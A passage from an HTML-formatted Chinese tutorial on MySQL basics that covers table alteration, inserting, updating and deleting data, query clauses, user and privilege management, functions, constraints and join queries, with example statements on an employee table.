<span class="hljs-keyword">TABLE</span> 表名 MODIFY 字段名 新数据类型(长度);<br>修改字段名和字段类型<br><span class="hljs-keyword">ALTER</span> <span class="hljs-keyword">TABLE</span> 表名 CHANGE 旧字段名 新字段名 类型(长度) [<span class="hljs-keyword">COMMENT</span> 注释] [约束];<br><br>删除字段<br><span class="hljs-keyword">ALTER</span> <span class="hljs-keyword">TABLE</span> 表名 <span class="hljs-keyword">DROP</span> 字段名;<br><br>修改表名<br><span class="hljs-keyword">ALTER</span> <span class="hljs-keyword">TABLE</span> 表名 <span class="hljs-keyword">RENAME</span> <span class="hljs-keyword">TO</span> 新表名;<br></code></pre></td></tr></table></figure><p>添加案例：</p><p><img src="/../image/%E6%B7%BB%E5%8A%A0%E6%A1%88%E4%BE%8B.png"></p><p>修改案例：</p><p><img src="/../image/%E4%BF%AE%E6%94%B9%E6%A1%88%E4%BE%8B.png"></p><p>删除案例：<br><img src="/../image/%E5%88%A0%E9%99%A4%E6%A1%88%E4%BE%8B.png"></p><p>修改表名：<br><img src="/../image/%E4%BF%AE%E6%94%B9%E8%A1%A8%E5%90%8D.png"></p><h3 id="DDL-表操作-删除"><a href="#DDL-表操作-删除" class="headerlink" title="DDL-表操作-删除"></a>DDL-表操作-删除</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sql">删除表<br><span class="hljs-keyword">DROP</span> <span class="hljs-keyword">TABLE</span> [IF <span class="hljs-keyword">EXISTS</span>] 表名;<br>删除指定表，并重新创建该表<br><span class="hljs-keyword">TRUNCATE</span> <span class="hljs-keyword">TABLE</span> 表名;等于清空这个表内的数据<br></code></pre></td></tr></table></figure><h2 id="DML"><a href="#DML" class="headerlink" title="DML"></a>DML</h2><h3 id="DML-添加数据"><a href="#DML-添加数据" class="headerlink" title="DML-添加数据"></a>DML-添加数据</h3><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">1</span>.给指定字段添加数据<br><span class="hljs-attribute">INSERT</span> INTO 表名 (字段名<span class="hljs-number">1</span>,字段名<span class="hljs-number">2</span>,...) VALUES (值<span class="hljs-number">1</span>,值<span class="hljs-number">2</span>,...);<br><span class="hljs-attribute">2</span>.给全部字段添加数据<br><span class="hljs-attribute">INSERT</span> INTO 表名 VALUES (值<span class="hljs-number">1</span>,值<span class="hljs-number">2</span>,...);<br><br><span class="hljs-attribute">3</span>.批量添加数据<br><span class="hljs-attribute">INSERT</span> INTO 表名 (字段名<span class="hljs-number">1</span>,字段名<span class="hljs-number">2</span>,...) VALUES (值<span class="hljs-number">1</span>,值<span class="hljs-number">2</span>,...),(值<span class="hljs-number">1</span>,值<span class="hljs-number">2</span>,...),(值<span class="hljs-number">1</span>,值<span class="hljs-number">2</span>,...);<br><span class="hljs-attribute">INSERT</span> INTO 表名 VALUES (值<span class="hljs-number">1</span>,值<span class="hljs-number">2</span>,...),(值<span class="hljs-number">1</span>,值<span class="hljs-number">2</span>,...),(值<span class="hljs-number">1</span>,值<span class="hljs-number">2</span>,...);<br></code></pre></td></tr></table></figure><p>注意：</p><ul><li>插入数据时，指定的字段顺序需要与值的顺序是一一对应的。</li><li>字符串和日期型数据应该包含在引号中。</li><li>插入的数据大小，应该在字段的规定范围内。</li></ul><h3 id="DML-修改数据"><a href="#DML-修改数据" class="headerlink" title="DML-修改数据"></a>DML-修改数据</h3><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">UPDATE</span> 表名 SET 字段名<span class="hljs-number">1</span> = 值<span class="hljs-number">1</span>,字段名<span class="hljs-number">2</span> = 值<span class="hljs-number">2</span>,...<span class="hljs-meta"> [WHERE 条件];</span><br></code></pre></td></tr></table></figure><p>案例：修改id为1的数据，将name修改为itheima</p><p><img src="/../image/DML%E4%BF%AE%E6%94%B91.png"></p><p>修改多个值：</p><p><img src="/../image/DML%E4%BF%AE%E6%94%B92.png"></p><p>注意：修改语句的条件可以有，也可以没有，如果没有条件，则会修改整张表的所有数据。</p><h3 id="DML-删除数据"><a href="#DML-删除数据" class="headerlink" title="DML-删除数据"></a>DML-删除数据</h3><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql"><span class="hljs-keyword">DELETE</span> <span class="hljs-keyword">FROM</span> 表名 [<span class="hljs-keyword">WHERE</span> 条件];<br></code></pre></td></tr></table></figure><p>案例：将gender为女的数据删除</p><p><img src="/../image/DML%E5%88%A0%E9%99%A4.png"></p><p>注意：</p><ul><li>DELETE语句的条件可以有，也可以没有，如果没有条件，则会删除整张表的所有数据</li><li>DELETE语句不能删除某一个字段的值(可以使用UPDATE)。</li></ul><h2 id="DQL"><a href="#DQL" class="headerlink" title="DQL"></a>DQL</h2><h3 id="DQL-语法"><a href="#DQL-语法" class="headerlink" title="DQL-语法"></a>DQL-语法</h3><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs n1ql"><span class="hljs-keyword">SELECT</span><br>字段列表<br><span class="hljs-keyword">FROM</span><br>表名列表<br><span class="hljs-keyword">WHERE</span><br>条件列表<br><span class="hljs-keyword">GROUP</span> <span class="hljs-keyword">BY</span><br>分组字段列表<br><span class="hljs-keyword">HAVING</span><br>分组后条件列表<br><span class="hljs-keyword">ORDER</span> <span class="hljs-keyword">BY</span><br>排序字段列表<br><span class="hljs-keyword">LIMIT</span><br>分页参数<br></code></pre></td></tr></table></figure><h3 id="DQL-基本查询"><a href="#DQL-基本查询" class="headerlink" title="DQL-基本查询"></a>DQL-基本查询</h3><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs n1ql">1.查询多个字段<br><span class="hljs-keyword">SELECT</span> 字段<span class="hljs-number">1</span>,字段<span class="hljs-number">2</span>,字段<span class="hljs-number">3.</span>.. <span class="hljs-keyword">FROM</span> 表名;<br><span class="hljs-keyword">SELECT</span> * <span class="hljs-keyword">FROM</span> 表名;<br><br>2.设置别名<br><span class="hljs-keyword">SELECT</span> 字段<span class="hljs-number">1</span> [<span class="hljs-keyword">AS</span> 别名<span class="hljs-number">1</span>],字段<span class="hljs-number">2</span> [<span class="hljs-keyword">AS</span> 别名<span class="hljs-number">2</span>] ... <span class="hljs-keyword">FROM</span> 表名;<br><br>3.去除重复记录<br><span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">DISTINCT</span> 字段列表 <span class="hljs-keyword">FROM</span> 表名;<br></code></pre></td></tr></table></figure><p>案例：</p><p>1.查询指定字段 name,workno,age返回</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">select</span> <span class="hljs-type">name</span>,workno,age <span class="hljs-keyword">from</span> emp;<br></code></pre></td></tr></table></figure><p>2.查询所有字段返回</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">select</span> id,workno,<span class="hljs-type">name</span>,gender,age,idcard,workaddress,entrydate <span class="hljs-keyword">from</span> emp;<br><br><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> emp;也用通配符*查询所有字段<br></code></pre></td></tr></table></figure><p>3.查询所有员工的工作地址，起别名</p><figure class="highlight axapta"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs axapta"><span class="hljs-keyword">select</span> workaddress <span class="hljs-keyword">as</span> <span class="hljs-string">&#x27;工作地址&#x27;</span> <span class="hljs-keyword">from</span> emp;<br> <br><span class="hljs-keyword">as</span>也可省略，效果一致<br><span class="hljs-keyword">select</span> workaddress <span class="hljs-string">&#x27;工作地址&#x27;</span> <span class="hljs-keyword">from</span> emp;<br></code></pre></td></tr></table></figure><p>4.查询公司员工的上班地址(不要重复)</p><figure class="highlight oxygene"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs oxygene">关键词：<span class="hljs-keyword">distinct</span><br><span class="hljs-keyword">select</span> <span class="hljs-keyword">distinct</span> workaddress <span class="hljs-string">&#x27;工作地址&#x27;</span> <span class="hljs-keyword">from</span> emp<span class="hljs-punctuation">;</span><br></code></pre></td></tr></table></figure><h3 id="DQL-条件查询-WHERE"><a href="#DQL-条件查询-WHERE" class="headerlink" title="DQL-条件查询(WHERE)"></a>DQL-条件查询(WHERE)</h3><p>1.语法：</p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql"><span class="hljs-keyword">SELECT</span> 字段列表 <span class="hljs-keyword">FROM</span> 表名 <span class="hljs-keyword">WHERE</span> 条件列表;<br></code></pre></td></tr></table></figure><p>2.条件：</p><p><img src="/../image/%E6%9D%A1%E4%BB%B6%E6%9F%A5%E8%AF%A2-%E6%9D%A1%E4%BB%B6.png"></p><p>注意：</p><p>1.如果要查的值是null不能用 where 字段列表 &#x3D; null 而是 where 字段列表 is null</p><p>如果要查不是null的值,要用where 字段列表 is not null</p><p>2.如果用了between..and…语句 注意范围</p><p>3.注意IN()和LIKE的用法：</p><p>LIKE的占位符：_表示匹配单个字符,%表示匹配任意个字符</p><p>例如查找姓名为两个字符的员工：select * from emp where name like ‘–’;</p><h3 id="DQL-聚合函数"><a href="#DQL-聚合函数" class="headerlink" title="DQL-聚合函数"></a>DQL-聚合函数</h3><p>介绍：将<strong>一列数据</strong>作为一个整体，进行纵向计算</p><p>常见聚合函数：</p><p><img src="/../image/%E5%B8%B8%E8%A7%81%E8%81%9A%E5%90%88%E5%87%BD%E6%95%B0.png"></p><p>语法：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">SELECT</span> 聚合函数(字段列表) <span class="hljs-selector-tag">FROM</span> 表名;<br></code></pre></td></tr></table></figure><p>例如：统计西安地区员工的年龄之和</p><figure class="highlight axapta"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs axapta"><span class="hljs-keyword">select</span> <span class="hljs-keyword">sum</span>(age) <span class="hljs-keyword">from</span> emp <span class="hljs-keyword">where</span> workaddress = <span class="hljs-string">&#x27;西安&#x27;</span>;<br></code></pre></td></tr></table></figure><p><strong>注意：null值不参与所有聚合函数运算</strong></p><h3 id="DQL-分组查询-GROUP-BY"><a href="#DQL-分组查询-GROUP-BY" class="headerlink" title="DQL-分组查询(GROUP BY)"></a>DQL-分组查询(GROUP BY)</h3><p>语法：</p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql"><span class="hljs-keyword">SELECT</span> 字段列表 <span class="hljs-keyword">FROM</span> 表名 [<span class="hljs-keyword">WHERE</span> 条件] <span class="hljs-keyword">GROUP</span> <span class="hljs-keyword">BY</span> 分组字段名 [<span class="hljs-keyword">HAVING</span> 分组后过滤条件];<br></code></pre></td></tr></table></figure><p>where与having的区别：</p><ul><li>执行时机不同：where是分组之前进行过滤，不满足where条件，不参与分组；而having是分组之后对结果进行过滤</li><li>判断条件不同：where不能对聚合函数进行判断，而having可以。</li></ul><p>例如：</p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs n1ql">根据性别分组，统计男性员工 和 女性员工的数量<br><span class="hljs-keyword">select</span> gender,<span class="hljs-built_in">count</span>(*) <span class="hljs-keyword">from</span> emp <span class="hljs-keyword">group</span> <span class="hljs-keyword">by</span> gender;<br>根据性别分组，统计男性员工 和 女性员工的平均年龄<br><span class="hljs-keyword">select</span> gender,<span class="hljs-built_in">avg</span>(age) <span class="hljs-keyword">from</span> emp <span class="hljs-keyword">group</span> <span class="hljs-keyword">by</span> gender;<br>查询年龄小于45的员工，并根据工作地址分组，获取员工数量大于等于3的工作地址<br><span class="hljs-keyword">select</span> workaddress,<span class="hljs-built_in">count</span>(*) <span class="hljs-keyword">from</span> emp <span class="hljs-keyword">where</span> age &lt; <span class="hljs-number">45</span> <span class="hljs-keyword">group</span> <span class="hljs-keyword">by</span> workaddress <span class="hljs-keyword">having</span> <span class="hljs-built_in">count</span>(*) &gt;= <span class="hljs-number">3</span>;<br></code></pre></td></tr></table></figure><p>注意：</p><ul><li>执行顺序：where &gt; 聚合函数 &gt; having。</li><li>分组之后，查询的字段一般为聚合函数和分组字段，查询其他字段无任何意义</li></ul><h3 id="DQL-排序查询-ORDER-BY"><a href="#DQL-排序查询-ORDER-BY" class="headerlink" title="DQL-排序查询(ORDER BY)"></a>DQL-排序查询(ORDER BY)</h3><p>语法：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">SELECT</span> 字段列表 FROM 表名 ORDER BY 字段<span class="hljs-number">1</span> 排序方式<span class="hljs-number">1</span>,字段<span class="hljs-number">2</span> 排序方式<span class="hljs-number">2</span>;<br></code></pre></td></tr></table></figure><p><strong>排序方式：</strong></p><ul><li>ASC：升序（默认值）</li><li>DESC：降序</li></ul><p><strong>注意：</strong></p><ul><li>如果是多字段排序，当第一个字段值相同时，才会根据第二个字段进行排序</li><li>ASC可省略</li></ul><p> 例如：</p><figure class="highlight axapta"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs axapta">根据年龄对公司的员工进行升序排序，如果年龄相同，再按照入职时间进行降序排序<br><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> emp <span class="hljs-keyword">order</span> <span class="hljs-keyword">by</span> age <span class="hljs-keyword">asc</span>,entrydate <span class="hljs-keyword">desc</span>;<br></code></pre></td></tr></table></figure><h3 id="DQL-分页查询-LIMIT"><a href="#DQL-分页查询-LIMIT" class="headerlink" title="DQL-分页查询(LIMIT)"></a>DQL-分页查询(LIMIT)</h3><p>语法：</p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql"><span class="hljs-keyword">SELECT</span> 字段列表 <span class="hljs-keyword">FROM</span> 表名 <span class="hljs-keyword">LIMIT</span> 起始索引,查询记录数;<br></code></pre></td></tr></table></figure><p>注意：</p><ul><li>起始索引从0开始，起始索引&#x3D;（查询页码-1）* 每页显示记录数</li><li>分页查询是数据库的方言，不同的数据库有不同的实现，MySQL中是LIMIT</li><li>如果查询的是第一页数据，起始索引可以省略，直接简写为 limit 10</li></ul><h3 id="DQL-执行顺序"><a href="#DQL-执行顺序" class="headerlink" title="DQL-执行顺序"></a>DQL-执行顺序</h3><p>执行顺序：</p><p><img src="/../image/DQL%E6%89%A7%E8%A1%8C%E9%A1%BA%E5%BA%8F.png"></p><p>序号为执行顺序，语法为编写顺序</p><h2 id="DCL"><a href="#DCL" class="headerlink" title="DCL"></a>DCL</h2><p>介绍：用来管理数据库用户、控制数据库的访问权限。</p><h3 id="DCL-管理用户"><a href="#DCL-管理用户" class="headerlink" title="DCL-管理用户"></a>DCL-管理用户</h3><p>语法：</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">查询用户<br>USE mysql;<br><span class="hljs-keyword">SELECT</span> * <span class="hljs-keyword">FROM</span> <span class="hljs-keyword">user</span>;<br><br>创建用户<br><span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">USER</span> <span class="hljs-string">&#x27;用户名&#x27;</span>@<span class="hljs-string">&#x27;主机名&#x27;</span> IDENTIFIED <span class="hljs-keyword">BY</span> <span class="hljs-string">&#x27;密码&#x27;</span>;<br><br>修改用户密码<br><span class="hljs-keyword">ALTER</span> <span class="hljs-keyword">USER</span> <span class="hljs-string">&#x27;用户名&#x27;</span>@<span class="hljs-string">&#x27;主机名&#x27;</span> IDENTIFIED <span class="hljs-keyword">WITH</span> mysql_native_password <span class="hljs-keyword">BY</span> <span class="hljs-string">&#x27;新密码&#x27;</span>;<br><br>删除用户<br><span class="hljs-keyword">DROP</span> <span class="hljs-keyword">USER</span> <span class="hljs-string">&#x27;用户名&#x27;</span>@<span class="hljs-string">&#x27;主机名&#x27;</span>;<br></code></pre></td></tr></table></figure><p>如果要让用户在任意主机访问该数据库只需要在创建用户时，主机名输入%</p><p>注意：</p><ul><li>主机名可以使用%通配</li><li>这类SQL开发人员操作的比较少，主要是DBA(数据库管理员)使用</li></ul><h3 id="DCL-权限控制"><a href="#DCL-权限控制" class="headerlink" title="DCL-权限控制"></a>DCL-权限控制</h3><p>MySQL中定义了很多权限，以下是常用的一些权限：</p><p><img src="/../image/%E5%B8%B8%E7%94%A8%E6%9D%83%E9%99%90.png"></p><p>语法：</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">查询权限<br><span class="hljs-keyword">SHOW</span> GRANTS <span class="hljs-keyword">FOR</span> <span class="hljs-string">&#x27;用户名&#x27;</span>@<span class="hljs-string">&#x27;主机名&#x27;</span>;<br><br>授予权限<br><span class="hljs-keyword">GRANT</span> 权限列表 <span class="hljs-keyword">ON</span> 数据库名.表名 <span class="hljs-keyword">TO</span> <span class="hljs-string">&#x27;用户名&#x27;</span>@<span class="hljs-string">&#x27;主机名&#x27;</span>;<br><br>撤销权限<br><span class="hljs-keyword">REVOKE</span> 权限列表 <span class="hljs-keyword">ON</span> 数据库名.表名 <span class="hljs-keyword">FROM</span> <span class="hljs-string">&#x27;用户名&#x27;</span>@<span class="hljs-string">&#x27;主机名&#x27;</span>;<br></code></pre></td></tr></table></figure><p>注意：</p><ul><li>多个权限之间，使用逗号分隔</li><li>授权时，数据库名和表名可以使用*进行通配，代表所有。</li></ul><h2 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h2><h3 id="字符串函数"><a href="#字符串函数" class="headerlink" title="字符串函数"></a>字符串函数</h3><p>MySQL内置的常用字符串函数：<br><img src="/../image/%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%87%BD%E6%95%B0.png"></p><p>例如：</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">update</span> emp <span class="hljs-keyword">set</span> workno = lpad(workno,<span class="hljs-number">5</span>,<span class="hljs-string">&#x27;0&#x27;</span>);<br></code></pre></td></tr></table></figure><p>注意：substring函数截取字符串索引是从1开始的</p><h3 id="数值函数"><a href="#数值函数" class="headerlink" title="数值函数"></a>数值函数</h3><p>常用的数值函数：</p><p><img src="/../image/%E6%95%B0%E5%80%BC%E5%87%BD%E6%95%B0.png"></p><p>例如：</p><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs less">通过数据库的函数，生成一个六位数的随机验证码<br><span class="hljs-selector-tag">select</span> <span class="hljs-selector-tag">lpad</span>(<span class="hljs-built_in">round</span>(<span class="hljs-built_in">rand</span>()*<span class="hljs-number">1000000</span>,<span class="hljs-number">0</span>),<span class="hljs-number">6</span>,<span class="hljs-string">&#x27;0&#x27;</span>);<br></code></pre></td></tr></table></figure><h3 id="日期函数"><a href="#日期函数" class="headerlink" title="日期函数"></a>日期函数</h3><p><img src="/../image/%E6%97%A5%E6%9C%9F%E5%87%BD%E6%95%B0.png"></p><h3 id="流程函数"><a href="#流程函数" class="headerlink" title="流程函数"></a>流程函数</h3><p><img src="/../image/%E6%B5%81%E7%A8%8B%E5%87%BD%E6%95%B0.png"></p><h2 id="约束"><a href="#约束" class="headerlink" title="约束"></a>约束</h2><p>概念：约束是作用于表中字段上的规则，用于限制存储在表中的数据</p><p>目的：保证数据库中数据的正确，有效性和完整性。</p><p>分类：</p><p><img src="/../image/%E7%BA%A6%E6%9D%9F.png"></p><p>注意：约束是作用于表中字段上的，可以在创建表&#x2F;修改表的时候添加约束</p><p>实现主键的自增长可使用<code>auto_increment</code></p><h3 id="外键约束"><a href="#外键约束" class="headerlink" title="外键约束"></a>外键约束</h3><p>概念：外键用来让两张表的数据之间建立连接，从而保证数据的一致性和完整性。</p><p>语法：</p><figure class="highlight sas"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs sas">添加外键<br><span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">TABLE</span> 表名(<br>字段名 数据类型,<br>...<br>[CONSTRAINT] [外键名称] <span class="hljs-keyword">FOREIGN</span> <span class="hljs-keyword">KEY</span>(外键字段名) <span class="hljs-keyword">REFERENCES</span> 主表(主表列名)<br>);<br><br><span class="hljs-keyword">ALTER</span> <span class="hljs-keyword">TABLE</span> 表名 <span class="hljs-keyword">ADD</span> CONSTRAINT 外键名称 <span class="hljs-keyword">FOREIGN</span> <span class="hljs-keyword">KEY</span>(外键字段名) <span class="hljs-keyword">REFERENCES</span> 主表(主表字段名);<br><br>删除外键<br><span class="hljs-keyword">ALTER</span> <span class="hljs-keyword">TABLE</span> 表名 <span class="hljs-keyword">DROP</span> <span class="hljs-keyword">FOREIGN</span> <span class="hljs-keyword">KEY</span> 外键名称;<br></code></pre></td></tr></table></figure><h3 id="外键删除-更新行为"><a href="#外键删除-更新行为" class="headerlink" title="外键删除&#x2F;更新行为"></a>外键删除&#x2F;更新行为</h3><p><img src="/../image/%E5%A4%96%E9%94%AE%E5%88%A0%E9%99%A4%E6%9B%B4%E6%96%B0.png"></p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">ALTER</span> <span class="hljs-keyword">TABLE</span> 表名 <span class="hljs-keyword">ADD</span> <span class="hljs-keyword">CONSTRAINT</span> 外键名称 <span class="hljs-keyword">FOREIGN KEY</span> (外键字段) <span class="hljs-keyword">REFERENCES</span> 主表名(主表字段名) <span class="hljs-keyword">ON</span> <span class="hljs-keyword">UPDATE</span> <span class="hljs-keyword">CASCADE</span> <span class="hljs-keyword">ON</span> <span class="hljs-keyword">DELETE</span> <span class="hljs-keyword">CASCADE</span>;<br></code></pre></td></tr></table></figure><h2 id="多表查询"><a href="#多表查询" class="headerlink" title="多表查询"></a>多表查询</h2><h3 id="多表关系"><a href="#多表关系" class="headerlink" title="多表关系"></a>多表关系</h3><p>概述：<br>项目开发中，在进行数据库表结构设计时，会根据业务需求及业务模块之间的关系，分析并设计表结构，由于业务之间相互关联，所以各个表结构之间也存在着各种联系，基本上分为三种：</p><ul><li>一对多(多对一)</li><li>多对多</li><li>一对一</li></ul><p><img src="/../image/%E4%B8%80%E5%AF%B9%E5%A4%9A.png"></p><p><img src="/../image/%E5%A4%9A%E5%AF%B9%E5%A4%9A.png"></p><p><img src="/../image/%E4%B8%80%E5%AF%B9%E4%B8%80.png"></p><h3 id="多表查询概述"><a href="#多表查询概述" class="headerlink" title="多表查询概述"></a>多表查询概述</h3><p>概述：指从多张表中查询数据</p><p>笛卡尔积：笛卡尔积是指在数学中，两个集合 A集合 和 B集合所有的组合情况。（在多表查询时，需要消除无效的笛卡尔积）</p><p>多表查询分类：</p><p>连接查询</p><p>​内连接：相当于查询A、B交集部分数据</p><p>​外连接：</p><p>​左外连接：查询左表所有数据，以及两张表交际部分数据</p><p>​右外连接：查询右表所有数据，以及两张表交集部分数据</p><p>​自连接：当前表与自身的连接查询，自连接必须使用表别名</p><p>子查询</p><h3 id="连接查询-内连接"><a href="#连接查询-内连接" class="headerlink" title="连接查询-内连接"></a>连接查询-内连接</h3><p>内连接查询语法：</p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs n1ql">隐式内连接<br><span class="hljs-keyword">SELECT</span> 字段列表 <span class="hljs-keyword">FROM</span> 表<span class="hljs-number">1</span>,表<span class="hljs-number">2</span> <span class="hljs-keyword">WHERE</span> 条件 ...;<br><br>显式内连接<br><span class="hljs-keyword">SELECT</span> 字段列表 <span class="hljs-keyword">FROM</span> 表<span class="hljs-number">1</span> [<span class="hljs-keyword">INNER</span>] <span class="hljs-keyword">JOIN</span> 表<span class="hljs-number">2</span> <span class="hljs-keyword">ON</span> 连接条件 ...;<br></code></pre></td></tr></table></figure><p>注意：内连接查询的是两张表交集的部分</p><p><img src="/../image/%E4%BA%A4%E9%9B%86.png"></p><p>例子：</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-comment">-- 查询员工姓名，及关联的部门的名称</span><br><span class="hljs-comment">-- 隐式</span><br><span class="hljs-keyword">select</span> e.name, d.name <span class="hljs-keyword">from</span> employee <span class="hljs-keyword">as</span> e, dept <span class="hljs-keyword">as</span> d <span class="hljs-keyword">where</span> e.dept = d.id;<br><span class="hljs-comment">-- 显式</span><br><span class="hljs-keyword">select</span> e.name, d.name <span class="hljs-keyword">from</span> employee <span class="hljs-keyword">as</span> e <span class="hljs-keyword">inner</span> <span class="hljs-keyword">join</span> dept <span class="hljs-keyword">as</span> d <span class="hljs-keyword">on</span> e.dept = d.id;<br></code></pre></td></tr></table></figure><h3 id="连接查询-外连接"><a href="#连接查询-外连接" class="headerlink" title="连接查询-外连接"></a>连接查询-外连接</h3><p>外连接查询语法：</p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs n1ql">左外连接<br><span class="hljs-keyword">SELECT</span> 字段列表 <span class="hljs-keyword">FROM</span> 表<span class="hljs-number">1</span> <span class="hljs-keyword">LEFT</span> [<span class="hljs-keyword">OUTER</span>] <span class="hljs-keyword">JOIN</span> 表<span class="hljs-number">2</span> <span class="hljs-keyword">ON</span> 条件 ...;<br>相当于查询表1(左表)的所有数据 包含 表1和表2交集部分的数据<br><br>右外连接<br><span class="hljs-keyword">SELECT</span> 字段列表 <span class="hljs-keyword">FROM</span> 表<span class="hljs-number">1</span> <span class="hljs-keyword">RIGHT</span> [<span class="hljs-keyword">OUTER</span>] <span class="hljs-keyword">JOIN</span> 表<span class="hljs-number">2</span> <span class="hljs-keyword">ON</span> 条件 ...;<br>相当于查询表2(右表)的所有数据 包含 表1和表2交集部分的数据<br></code></pre></td></tr></table></figure><p><img src="/../image/%E4%BA%A4%E9%9B%86.png"></p><p>例子：</p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs n1ql">-- 左<br><span class="hljs-keyword">select</span> <span class="hljs-built_in">e</span>.*, d.name <span class="hljs-keyword">from</span> employee  <span class="hljs-built_in">e</span> <span class="hljs-keyword">left</span> <span class="hljs-keyword">outer</span> <span class="hljs-keyword">join</span> dept  d <span class="hljs-keyword">on</span> <span class="hljs-built_in">e</span>.dept = d.id;<br><span class="hljs-keyword">select</span> d.name, <span class="hljs-built_in">e</span>.* <span class="hljs-keyword">from</span> dept d <span class="hljs-keyword">left</span> <span class="hljs-keyword">outer</span> <span class="hljs-keyword">join</span> emp <span class="hljs-built_in">e</span> <span class="hljs-keyword">on</span> <span class="hljs-built_in">e</span>.dept = d.id;  -- 这条语句与下面的语句效果一样<br><br>-- 右<br><span class="hljs-keyword">select</span> d.name, <span class="hljs-built_in">e</span>.* <span class="hljs-keyword">from</span> employee  <span class="hljs-built_in">e</span> <span class="hljs-keyword">right</span> <span class="hljs-keyword">outer</span> <span 